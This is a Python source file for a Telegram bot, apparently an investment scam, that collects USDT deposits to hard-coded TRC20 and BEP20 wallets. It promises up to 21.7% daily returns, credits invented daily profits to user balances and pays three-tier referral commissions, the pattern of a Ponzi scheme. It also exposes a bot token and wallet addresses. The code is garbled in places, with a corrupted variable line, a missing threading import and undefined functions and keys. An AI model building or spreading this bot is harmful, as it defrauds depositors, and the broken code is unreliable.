import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import time
import logging
from datetime import datetime

logging.basicConfig(filename='bot_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

BOT_TOKEN = '8268425583:AAFkSCeYzXAU2gcyz-tZLSwpzVg0uZ061IU'
ADMIN_ID = 7989867522
ADMIN_USERNAME = '@YourAdminUsername'

bot = telebot.TeleBot(BOT_TOKEN)

TRC20_WALLET = "TQzZgrHNtG9i8mGufpvW12sxFuy"
BEP20_WALLET = "0x7485e33695b722aA071A868bb6959533a3e449b02E"

conn = sqlite3.connect('elite_yield.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    balance REAL DEFAULT 0,
    total_profit REAL DEFAULT 0,
    level TEXT DEFAULT 'Bronze',
    last_profit_time INTEGER DEFAULT 0,
    referrer_id INTEGER DEFAULT NULL,
    created_at INTEGER DEFAULT 0,
    language TEXT DEFAULT 'en',
    deposit_amount REAL DEFAULT 0
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS pending_deposits (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    amount REAL,
    status TEXT DEFAULT 'pending',
    created_at INTEGER
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS pending_withdraws (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    amount REAL,
    wallet_address TEXT,
    status TEXT DEFAULT 'pending',
    created_at INTEGER
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS support_messages (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    message_text TEXT,
    status TEXT DEFAULT 'new',
    created_at INTEGER
)''')
conn.commit()

languages = {
    'en': {
        'welcome': """🌟 Welcome to Elite Yield Bot! 🚀

Unlock up to 21.7% DAILY returns on your USDT investments! 💰

💎 Levels based on deposit:
• $10-99: 16.6%
• $100-799: 17.9%  
• $800-2399: 19.6%
• $2400-5999: 21.7%

💳 Min deposit: $10 USDT
🌐 Networks: TRC20 or BEP20

Start earning passive income today! 📈""",
        'balance': """💰 Your Balance: ${balance:.2f} USDT
📈 Total Profit: ${total_profit:.2f} USDT
💎 Level: {level}""",
        'deposit_instructions': """💳 Deposit Instructions:

Send USDT to one of these addresses:
🌐 TRC20 (Tron): `{TRC20_WALLET}`
🌐 BEP20 (BSC): `{BEP20_WALLET}`

💡 Minimum: $10
⚠️ Only USDT!

Enter amount to deposit:""",
        'enter_amount': 'Enter amount (min $10):',
        'invalid_amount': '❌ Invalid amount!',
        'enter_wallet': 'Enter your wallet address (TRC20/BEP20):',
        'withdraw_submitted': '✅ Withdrawal request submitted! Waiting for admin approval...',
        'referral_text': """👥 Your Referral Link:
`{ref_link}`

📊 Referrals: {ref_count}
💰 Earn commissions from 3 levels!""",
        'support': 'Send your message to support (will be forwarded to admin):',
        'choose_language': 'Choose your language:',
        'english': 'English 🇺🇸',
        'persian': 'Persian 🇮🇷',
        'turkish': 'Turkish 🇹🇷',
        'arabic': 'Arabic 🇸🇦',
        'balance_btn': '💰 Balance',
        'deposit_btn': '💳 Deposit',
        'withdraw_btn': '💸 Withdraw',
        'referral_btn': '👥 Referral',
        'support_btn': '📞 Support',
        'admin_btn': '🛠 Admin Panel',
        'daily_profit': '📈 Daily profit added: ${profit:.2f} ({rate}% rate)!\nNew balance: ${new_balance:.2f}'
    },
    # fa, tr, ar مشابه, btnها ترجمه شده
    'fa': {
        # ... ترجمه btnها مثل 'موجودی' برای balance_btn
        'balance_btn': '💰 موجودی',
        'deposit_btn': '💳 واریز',
        # ... 
    },
    # tr and ar similar
}

def get_profit_rate(amount):
    if 2400 <= amount <= 5999: return 0.217
    if 800 <= amount <= 2399: return 0.196
    if 100 <= amount <= 799: return 0.179
    if 10 <= amount <= 99: return 0.166
    return 0

def main_menu(is_admin=False, lang='en'):
    l = languages[lang]
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(l['balance_btn'], l['deposit_btn'])
    markup.add(l['withdraw_btn'], l['referral_btn'])
    markup.add(l['support_btn'])
    if is_admin:
        markup.add(l['admin_btn'])
    return markup

def admin_menu(lang='en'):
    l = languages[lang]
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    btn_users = KeyboardButton(l['users_list_btn'] if 'users_list_btn' in l else '👥 Users List')
    btn_pending = KeyboardButton('⏳ Pending Requests')
    btn_stats = KeyboardButton('📊 Statistics')
    btn_support_tickets = KeyboardButton('📞 Support Tickets')
    btn_back = KeyboardButton('🔙 Back')
    markup.add(btn_users, btn_pending)
    markup.add(btn_stats, btn_support_tickets)
    markup.add(btn_back)
    return markup

# زبان منو
def get_user_lang(user_id):
    try:
        cursor.execute('SELECT language FROM users WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        conn.commit()
        return result[0] if result else 'en'
    except:
        return 'en'

@bot.message_handler(commands=['start'])
def start_message(message):
    user_id = message.from_user.id
    username = message.from_user.username or f"User_{user_id}"
    args = message.text.split()
    
    referrer_id = None
    if len(args) > 1 and args[1].startswith('ref_'):
        try:
            referrer 当前_id = int(args[1].split('_')[1])
            if referrer_id != user_id:
                cursor.execute('UPDATE users SET referrer_id = ? WHERE user_id = ?', (referrer_id, user_id))
                conn.commit()
        except:
            pass
    
    try:
        cursor.execute('SELECT language FROM users WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        conn.commit()
    except:
        result = None
    
    lang = result[0] if result else 'en'
    
    if not result:
        current_time = int(time.time())
        cursor.execute('INSERT INTO users (user_id, username, created_at, language) VALUES (?, ?, ?, ?)', (user_id, username, current_time, lang))
        conn.commit()
        bot.send_message(message.chat.id, languages['en']['choose_language'], reply_markup=language_menu())
        return
    
    cursor.execute('UPDATE users SET username = ? WHERE user_id = ?', (username, user_id))
    conn.commit()
    
    is_admin = user_id == ADMIN_ID
    
    try:
        with open('welcome_banner.jpg', 'rb') as banner:
            bot.send_photo(message.chat.id, banner, caption=languages[lang]['welcome'], reply_markup=main_menu(is_admin, lang))
    except:
        bot.send_message(message.chat.id, languages[lang]['welcome'], reply_markup=main_menu(is_admin, lang))

@bot.callback_query_handler(func=lambda call: call.data.startswith('lang_'))
def set_language(call):
    lang = call.data.split('_')[1]
    cursor.execute('UPDATE users SET language = ? WHERE user_id = ?', (lang, call.from_user.id))
    conn.commit()
    bot.answer_callback_query(call.id, "Language set!")
    start_message(call.message)

@bot.message_handler(func=lambda message: True)
def handle_menu(message):
    user_id = message.from_user.id
    lang = get_user_lang(user_id)
    l = languages[lang]
    
    try:
        cursor.execute('SELECT balance, total_profit, level FROM users WHERE user_id = ?', (user_id,))
        user_data = cursor.fetchone()
        conn.commit()
    except:
        user_data = None
    
    balance, total_profit, level = user_data or (0, 0, 'Bronze')
    is_admin = user_id == ADMIN_ID
    
    btn_balance = l['balance_btn']
    btn_deposit = l['deposit_btn']
    btn_withdraw = l['withdraw_btn']
    btn_referral = l['referral_btn']
    btn_support = l['support_btn']
    btn_admin = l['admin_btn']
    
    if message.text == btn_balance:
        text = l['balance'].format(balance=balance, total_profit=total_profit, level=level)
        bot.send_message(message.chat.id, text, reply_markup=main_menu(is_admin, lang))
    
    elif message.text == btn_deposit:
        bot.send_message(message.chat.id, l['deposit_instructions'].format(TRC20_WALLET=TRC20_WALLET, BEP20_WALLET=BEP20_WALLET))
        msg = bot.send_message(message.chat.id, l['enter_amount'])
        bot.register_next_step_handler(msg, process_deposit_amount)
    
    elif message.text == btn_withdraw:
        if balance < 1:  # min $1
            bot.send_message(message.chat.id, '❌ Min withdraw $1', reply_markup=main_menu(is_admin, lang))
            return
        msg = bot.send_message(message.chat.id, l['enter_amount'])
        bot.register_next_step_handler(msg, process_withdraw_request)
    
    elif message.text == btn_referral:
        ref_link = f't.me/eliteyieldbot?start=ref_{user_id}'
        try:
            cursor.execute('SELECT COUNT(*) FROM users WHERE referrer_id = ?', (user_id,))
            ref_count = cursor.fetchone()[0]
            conn.commit()
        except:
            ref_count = 0
        text = l['referral_text'].format(ref_link=ref_link, ref_count=ref_count)
        bot.send_message(message.chat.id, text, reply_markup=main_menu(is_admin, lang))
    
    elif message.text == btn_support:
        bot.send_message(message.chat.id, l['support'])
        bot.register_next_step_handler(message, forward_support_to_admin)
    
    if is_admin:
        if message.text == btn_admin:
            bot.send_message(message.chat.id, l['admin_panel'], reply_markup=admin_menu(lang))
        
        elif message.text == '👥 Users List':
            # ... 
            pass
        
        elif message.text == '📞 Support Tickets':
            cursor.execute('SELECT id, user_id, username, message_text, created_at FROM support_messages WHERE status = "new" ORDER BY created_at DESC')
            tickets = cursor.fetchall()
            conn.commit()
            if not tickets:
                bot.send_message(message.chat.id, 'No new tickets.')
            for ticket in tickets:
                markup = InlineKeyboardMarkup()
                markup.add(InlineKeyboardButton('Reply', callback_data=f'support_reply_{ticket[0]}'), InlineKeyboardButton('Seen', callback_data=f'support_seen_{ticket[0]}'))
                bot.send_message(message.chat.id, f"Ticket {ticket[0]} from {ticket[2]} (ID: {ticket[1]})\nText: {ticket[3]}\nTime: {datetime.fromtimestamp(ticket[4])}", reply_markup=markup)

def forward_support_to_admin(message):
    user_id = message.from_user.id
    username = message.from_user.username or 'Unknown'
    text = message.text
    current_time = int(time.time())
    cursor.execute('INSERT INTO support_messages (user_id, username, message_text, created_at) VALUES (?, ?, ?, ?)', (user_id, username, text, current_time))
    conn.commit()
    ticket_id = cursor.lastrowid
    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('Reply', callback_data=f'support_reply_{ticket_id}'), InlineKeyboardButton('Seen', callback_data=f'support_seen_{ticket_id}'))
    bot.send_message(ADMIN_ID, f"New support ticket {ticket_id} from {username} (ID: {user_id})", reply_markup=markup)
    bot.send_message(message.chat.id, 'Message sent to support!')

# reply and seen callbacks
@bot.callback_query_handler(func=lambda call: call.data.startswith('support_reply_'))
def support_reply(call):
    ticket_id = call.data.split('_')[2]
    msg = bot.send_message(ADMIN_ID, 'Enter reply:')
    bot.register_next_step_handler(msg, lambda m: send_support_reply(m, ticket_id))

def send_support_reply(message, ticket_id):
    reply_text = message.text
    cursor.execute('SELECT user_id FROM support_messages WHERE id = ?', (ticket_id,))
    user_id = cursor.fetchone()[0]
    conn.commit()
    bot.send_message(user_id, f"Support reply: {reply_text}")
    cursor.execute('UPDATE support_messages SET status = "replied" WHERE id = ?', (ticket_id,))
    conn.commit()
    bot.send_message(ADMIN_ID, 'Reply sent!')

@bot.callback_query_handler(func=lambda call: call.data.startswith('support_seen_'))
def support_seen(call):
    ticket_id = call.data.split('_')[2]
    cursor.execute('UPDATE support_messages SET status = "seen" WHERE id = ?', (ticket_id,))
    conn.commit()
    bot.answer_callback_query(call.id, "Marked as seen!")

# deposit process
def process_deposit_amount(message):
    try:
        amount = float(message.text)
        if amount < 10:
            bot.send_message(message.chat.id, languages['en']['invalid_amount'])
            return
        user_id = message.from_user.id
        lang = get_user_lang(user_id)
        l = languages[lang]
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(l['confirm_deposit'].format(amount=amount), callback_data=f'dep_confirm_{user_id}_{amount}'))
        bot.send_message(message.chat.id, f"Confirm ${amount} deposit:", reply_markup=markup)
    except:
        bot.send_message(message.chat.id, 'Invalid number!')

@bot.callback_query_handler(func=lambda call: call.data.startswith('dep_confirm_'))
def dep_confirm(call):
    parts = call.data.split('_')
    user_id = int(parts[2])
    amount = float(parts[3])
    username = 'Unknown'
    try:
        cursor.execute('SELECT username FROM users WHERE user_id = ?', (user_id,))
        username = cursor.fetchone()[0]
        conn.commit()
    except:
        pass
    current_time = int(time.time())
    cursor.execute('INSERT INTO pending_deposits (user_id, username, amount, created_at) VALUES (?, ?, ?, ?)',
                  (user_id, username, amount, current_time))
    deposit_id = cursor.lastrowid
    conn.commit()
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('✅ Confirm', callback_data=f'admin_confirm_dep_{deposit_id}'),
              InlineKeyboardButton('❌ Reject', callback_data=f'admin_reject_dep_{deposit_id}'))
    
    admin_msg = f"💳 New Deposit Request:\nUser: {username} (ID: {user_id})\nAmount: ${amount}"
    bot.send_message(ADMIN_ID, admin_msg, reply_markup=markup)
    
    bot.answer_callback_query(call.id, "✅ Request sent to admin!")
    bot.edit_message_text("✅ Your deposit request has been submitted! Admin will confirm soon.", call.message.chat.id, call.message.message_id)

# admin confirm dep
@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_confirm_dep_'))
def admin_confirm_dep(call):
    deposit_id = int(call.data.split('_')[3])
    try:
        cursor.execute('SELECT user_id, amount FROM pending_deposits WHERE id = ?', (deposit_id,))
        dep_data = cursor.fetchone()
        conn.commit()
        if dep_data:
            user_id, amount = dep_data
            cursor.execute('UPDATE users SET balance = balance + ?, deposit_amount = ? WHERE user_id = ?', (amount, amount, user_id))
            new_balance = cursor.execute('SELECT balance FROM users WHERE user_id = ?', (user_id,)).fetchone()[0]
            conn.commit()
            rate = get_profit_rate(amount)
            cursor.execute('UPDATE users SET level = ? WHERE user_id = ?', (f'Level for ${amount}', user_id))
            conn.commit()
            
            # Referral 3 level
            referrer_id = cursor.execute('SELECT referrer_id FROM users WHERE user_id = ?', (user_id,)).fetchone()[0]
            if referrer_id:
                # Level 1
                comm1 = amount * 0.10
                cursor.execute('UPDATE users SET balance = balance + ? WHERE user_id = ?', (comm1, referrer_id))
                conn.commit()
                bot.send_message(referrer_id, f'Level 1 commission: ${comm1:.2f}')
                
                # Level 2
                cursor.execute('SELECT referrer_id FROM users WHERE user_id = ?', (referrer_id,))
                level2 = cursor.fetchone()
                if level2 and level2[0]:
                    comm2 = amount * 0.08
                    cursor.execute('UPDATE users SET balance = balance + ? WHERE user_id = ?', (comm2, level2[0]))
                    conn.commit()
                    bot.send_message(level2[0], f'Level 2 commission: ${comm2:.2f}')
                    
                    # Level 3
                    cursor.execute('SELECT referrer_id FROM users WHERE user_id = ?', (level2[0],))
                    level3 = cursor.fetchone()
                    if level3 and level3[0]:
                        comm3 = amount * 0.03
                        cursor.execute('UPDATE users SET balance = balance + ? WHERE user_id = ?', (comm3, level3[0]))
                        conn.commit()
                        bot.send_message(level3[0], f'Level 3 commission: ${comm3:.2f}')
            
            cursor.execute('UPDATE pending_deposits SET status = "confirmed" WHERE id = ?', (deposit_id,))
            conn.commit()
            
            bot.send_message(user_id, f'✅ Deposit ${amount} confirmed! New balance: ${new_balance:.2f}')
            logging.info(f'Deposit ${amount} confirmed for {user_id}')
    except Exception as e:
        logging.error(f'Deposit confirm error: {e}')
    bot.answer_callback_query(call.id, "✅ Confirmed!")

# withdraw process (min $1)
def process_withdraw_request(message):
    try:
        amount = float(message.text)
        user_id = message.from_user.id
        cursor.execute('SELECT balance, username FROM users WHERE user_id = ?', (user_id,))
        user_data = cursor.fetchone()
        conn.commit()
        
        if not user_data or amount > user_data[0] or amount < 1:
            bot.send_message(message.chat.id, '❌ Invalid amount or insufficient balance! Min $1', reply_markup=main_menu(user_id == ADMIN_ID))
            return
        
        username = user_data[1]
        wallet_msg = bot.send_message(message.chat.id, 'Enter your wallet address (TRC20/BEP20):')
        bot.register_next_step_handler(wallet_msg, lambda msg: process_withdraw_wallet(msg, amount, username))
    except:
        bot.send_message(message.chat.id, '❌ Enter valid number!', reply_markup=main_menu(user_id == ADMIN_ID))

# daily profit thread
def add_daily_profit():
    while True:
        try:
            cursor.execute('SELECT user_id, deposit_amount, last_profit_time, language FROM users WHERE deposit_amount > 0')
            users = cursor.fetchall()
            conn.commit()
            current_time = int(time.time())
            for user in users:
                user_id, deposit_amount, last_time, lang = user
                if current_time - last_time >= 86400:
                    rate = get_profit_rate(deposit_amount)
                    profit = deposit_amount * rate
                    cursor.execute('UPDATE users SET balance = balance + ?, total_profit = total_profit + ?, last_profit_time = ? WHERE user_id = ?',
                                   (profit, profit, current_time, user_id))
                    conn.commit()
                    bot.send_message(user_id, languages[lang]['daily_profit'].format(profit=profit, rate=rate*100))
        except Exception as e:
            logging.error(f'Profit error: {e}')
        time.sleep(3600)

threading.Thread(target=add_daily_profit, daemon=True).start()

# اجرای ربات
if __name__ == '__main__':
    print("Bot starting...")
    bot.polling(none_stop=True)
